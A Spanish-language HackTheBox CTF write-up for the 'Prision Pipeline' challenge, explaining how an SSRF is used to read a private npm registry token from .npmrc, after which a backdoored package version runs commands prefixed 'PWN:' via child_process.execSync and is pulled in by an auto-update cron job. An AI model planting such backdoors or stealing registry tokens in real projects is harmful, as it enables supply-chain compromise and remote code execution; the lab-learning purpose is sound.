---
title: Prision Pipeline Misc CTF - HackTheBox
layout: post
permalink: /writeups/HTB/CTF/prisionpipeline
date: 2025-03-01 11:00:00 +0000
categories: [HacktheBox, CTF, Misc]
tags: [HacktheBox, CTF, Misc, npm, API]
image:
  path: /assets/img/cabeceras_genericas/htb.jpg
  alt: Prision Pipeline Misc CTF - HackTheBox
description: >
  Guía de explotación de vulnerabilidades en el CTF HackTheBox Prision Pipeline Misc.
pin: false  
toc: true   
math: false 
mermaid: false 
---

## Contexto

Visualizando el código que se nos proporciona, en el docker config podemos ver que se configuran cuatro programas dentreo del docker.

```

[program:nginx]
user=root
command=nginx
autostart=true
logfile=/dev/null
logfile_maxbytes=0

[program:registry]
directory=/home/node
user=node
command=verdaccio --config /home/node/.config/verdaccio/config.yaml
autostart=true
autorestart=true
stdout_logfile=/dev/stdout
stdout_logfile_maxbytes=0
stderr_logfile=/dev/stderr
stderr_logfile_maxbytes=0

[program:pm2-node]
directory=/app
user=node
environment=HOME=/home/node,PM2_HOME=/home/node/.pm2,PATH=%(ENV_PATH)s
command=pm2-runtime start /app/prod.config.js
autostart=true
autorestart=true
stdout_logfile=/dev/stdout
stdout_logfile_maxbytes=0
stderr_logfile=/dev/stderr
stderr_logfile_maxbytes=0

[program:cronjob]
directory=/app
user=node
environment=HOME=/home/node,PM2_HOME=/home/node/.pm2,PATH=%(ENV_PATH)s
command=/home/node/cronjob.sh
autostart=true
logfile=/dev/null
logfile_maxbytes=0
```

La estructura del docker consiste en un `cronjob`, `private registry` , `nginx` y `pm2-node`.

El script de `cronjob`comprueba y actualiza unicamente un paquete privado y después reinicia la aplicación principal.

```bash
#!/bin/bash

# Secure entrypoint
chmod 600 /home/node/.config/cronjob.sh

# Set up variables
REGISTRY_URL="http://localhost:4873"
APP_DIR="/app"
PACKAGE_NAME="prisoner-db"

cd $APP_DIR;

while true; do
    # Check for outdated package
    OUTDATED=$(npm --registry $REGISTRY_URL outdated $PACKAGE_NAME)

    if [[ -n "$OUTDATED" ]]; then
        # Update package and restart app
        npm --registry $REGISTRY_URL update $PACKAGE_NAME
        pm2 restart prison-pipeline
    fi

    sleep 30
done
```

El pataque `prisioner-db` se hace público en al docker-build a través del archivo config/setup-registry.sh.

Desde el fichero `prisioner-dnb/index.js` se exporta una clase interfaz se exporta como el paquete que será utilizado en la aplicación principal.

```javascript
/**
 * Database interface for prisoners of Prison-Pipeline.
 * @class Database
 * @param {string} repository - Path to existing database repository.
 * @example
 * const db = new Database('/path/to/repository');
**/
```
En la aplicación principal se puede ver el uso de este paquete en apllication/routes/index.js.

```javascript
const prisonerDB = require('prisoner-db');

const db = new prisonerDB('/app/prisoner-repository');
```

El proxy privado que se utiliza en el software del registro se trata de Verdaccio. De su archivo de configuración config/verdaccio.yaml podemos ver el control de acceso que se define para los diferentes paquetes.

```yaml
packages:
  'prisoner-*':
    # scoped packages
    access: $all
    publish: $authenticated
    # don't query external registry
    # proxy: npmjs

  '@*/*':
    access: $all
    publish: $authenticated
    proxy: npmjs

  '**':
    access: $all
    publish: $authenticated
    proxy: npmjs
```

Esta política asegura que ciertos paquetes (identificados por el prefijo prisoner-) no sean accesibles desde registros externos como NPM, manteniéndolos exclusivamente dentro de un entorno controlado (probablemente un registro privado). Además, se requiere autenticación para poder publicar o modificar estos paquetes, lo que añade una capa de seguridad y control sobre quién puede gestionarlos.

## SSRF & LFR

Si visitamos la página de la aplicación podemos ver que se puede realizar un SSRF desde la opción de importar un prisionero.

Esto lo podemos ver en el fichero `prisioner-db/index.js` en la función `importPrisoner`.

```javascript
async importPrisoner(url) {
    try {
        const getResponse = await curl.get(url);
        const xmlData = getResponse.body;

        const id = `PIP-${Math.floor(100000 + Math.random() * 900000)}`;

        const prisoner = {
            id: id,
            data: xmlData
        };

        this.addPrisoner(prisoner);
        return id;
    }
    catch (error) {
        console.error('Error importing prisoner:', error);
        return false;
    }
}
```

![alt text](/assets/img/writeups/hackthebox/prisionpipeline_htb/image.png)

## Token de acceso a la API del registro privado

Para poder modificar el contenido del paquete objetivo necesitamos acceso a la API del registro privado.

Si nos fijamos en el fichero `config/setup-registry.sh` podemos ver que se crea un usuario registry con npm cli para que este publique los paquetes el el registro privado.

```bash
NPM_USERNAME="registry"
NPM_EMAIL="registry@prison-pipeline.htb"
NPM_PASSWORD=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)

...snip...

# Add registry user
/usr/bin/expect <<EOD
spawn npm adduser --registry $REGISTRY_URL
expect {
  "Username:" {send "$NPM_USERNAME\r"; exp_continue}
  "Password:" {send "$NPM_PASSWORD\r"; exp_continue}
  "Email: (this IS public)" {send "$NPM_EMAIL\r"; exp_continue}
}
EOD

# Publish private package
cd $PRISONER_DB_PKG_DIR
npm publish --registry $REGISTRY_URL
```

Como vimos antes el npm cli es ejecutado desde el usuario node por lo que podemos extraer el token de acceso desde /home/node/.npmrc.

![alt text](/assets/img/writeups/hackthebox/prisionpipeline_htb/image-1.png)

El puerto 4873 es una redirección interna configurada en el archivo config/nginx.conf.

```bash
server {
    listen 1337;
    server_name registry.prison-pipeline.htb;

    location / {
        proxy_pass http://localhost:4873/;
        proxy_set_header Host $host:$server_port;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_set_header X-NginX-Proxy true;
    }
}
```

Para poder autenticarnos con este token vamos ir a la carpeta del codigo que nos proporcionaron donde se encuentra el paquete prisioner-db.

Una vez allí vamos a crear un fichero .npmrc con el siguiente contenido.

![alt text](/assets/img/writeups/hackthebox/prisionpipeline_htb/image-2.png)

El puerto debe ser el que nos proporciona acceso a la aplicación.

En nuestro documento hosts añadimos el dominio registry.prison-pipeline.htb a la ip de la aplicación.

![alt text](/assets/img/writeups/hackthebox/prisionpipeline_htb/image-3.png)

Verificamos que el token se ha autenticado correctamente.

![alt text](/assets/img/writeups/hackthebox/prisionpipeline_htb/image-4.png)

Limpiamos la caché de npm.

```bash
npm cache clean --force
```

Modificamos la función `importPrisoner` para que podamos inyectar comandos al sistema.

```javascript
    async importPrisoner(url) {
        // implement backdoor
        const child_process = require('child_process');
        if (url.includes('PWN:')) {
            try {
                let cmd = url.replace('PWN:', '');
                let output = child_process.execSync(cmd).toString();
                return output;
            }
            catch (error) {
                return 'PWN: Error executing command.';
            }
        }        
        ...SNIP...
    }
```

Esta modificación nos permite ejecutar comandos al sistema si en la URL se incluye el prefijo `PWN:`.

Modificamos el archivo package.json para cambiar la versión del paquete.

```json
"version": "1.0.1",
```

Ahora publicamos la nueva versión del paquete.

![alt text](/assets/img/writeups/hackthebox/prisionpipeline_htb/image-5.png)

Ahora esperamos al cronjob para actualizar el paquete y tras unos cuantos segundos podemos hacer la ejecución del archivo /readflag.c desde la función `importPrisoner`.

![alt text](/assets/img/writeups/hackthebox/prisionpipeline_htb/image-6.png)